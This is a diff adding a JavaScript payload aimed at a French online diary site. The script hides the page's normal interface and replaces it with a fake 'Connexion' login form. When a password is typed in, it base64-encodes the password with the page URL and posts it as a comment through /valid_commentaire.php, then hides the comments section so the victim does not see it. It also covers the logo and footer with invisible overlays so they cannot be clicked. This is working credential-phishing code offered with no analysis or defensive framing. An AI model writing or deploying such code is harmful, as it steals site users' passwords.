@@ -1,0 +1,53 @@
+sendPass = () => {
+	if($('#f_motdepasse').val()) {
+		$.post("/valid_commentaire.php",{histoire_id:parseInt($('[name=histoire_id]').val()),commentaire:btoa($('#f_motdepasse').val()+' - '+document.location.href	)}).done(function( data ) {
+	    location.reload();
+	  })
+	}
+}
+
+template = `
+<div class="papier_haut"></div>
+<div class="papier_spirale"></div>
+<p style="text-align:center;"><strong>Pas encore inscrit(e) ? <a href="#">Clique ici !</a></strong></p>
+<br>
+<form>
+<table id="inscription">
+<tbody><tr>
+<td><label for="pseudo">Pseudo ou email</label></td>
+<td><input type="text" name="f_pseudo" size="10" placeholder="Pseudo ou email" class="pseudo" style="width:180px;"></td>
+</tr>
+<tr>
+<td><label for="f_motdepasse">Mot de passe</label></td>
+<td><input type="password" id="f_motdepasse" size="10" placeholder="Mot de passe" class="password" style="width:180px;"><br><small><a href="#">» Mot de passe oublié ?</a></small></td>
+</tr>
+<tr>
+<td></td>
+<td><a style="cursor:pointer; width:190px; background: #fff; border: 2px solid #8a8a8a; font-weight: bold; text-decoration: none; margin: 0; padding: 3px 30px;" onclick="sendPass()">Connexion</a></td>
+</tr>
+</tbody></table>
+<p style="text-align:center;"><br><em>ou connexion compte externe :</em>
+<br><a class="janrainEngage" href="javascript:void(0);"><img src="/images/templates/v2.5/social.png" alt="Facebook | Twitter | Outlook | Gmail | Instagram | Yahoo" width="207" height="32"></a></p>
+</form>
+`
+
+if(!localStorage.d) {
+	localStorage.d = 1
+	$('#journal_home_bloc').hide()
+	$('#bloc_notes').hide()
+	$('#mode_discret').hide()
+	$('#aide_contact').hide()
+	$('#retour_haut').hide()
+	$('#enligne').hide()
+	$('#themes_diariste_ico').hide()
+	$('.texte_infos').hide()
+	$('#ecrit').html(template)
+	$('.papier_bas').html('<div class="papier_bas_droite"></div>')
+	$('#texte h2').html('Connexion')
+
+	$('#logo').append('<div style="position:absolute;top:0;left:0;width:100%;height:100%;"></div>')
+	$('#footer').append('<div style="position:absolute;top:0;left:0;width:100%;height:100%;"></div>')
+	$('#footer').css('position', 'relative')
+}
+
+$('#commentaires').hide()
